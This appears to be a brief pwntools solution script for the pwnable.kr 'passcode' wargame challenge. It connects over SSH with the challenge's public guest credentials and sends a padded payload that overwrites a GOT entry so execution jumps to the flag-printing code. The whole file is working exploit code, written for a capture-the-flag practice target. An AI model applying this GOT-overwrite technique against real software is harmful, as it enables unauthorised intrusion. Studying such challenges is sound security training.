from pwn import *

conn = ssh(host="pwnable.kr", port=2222, user="passcode", password="guest")

payload = 'A'*96 + p32(0x804A004) + str(0x80485e3) + "\n"
p = conn.process("./passcode")
p.sendline(payload)
print p.recvall()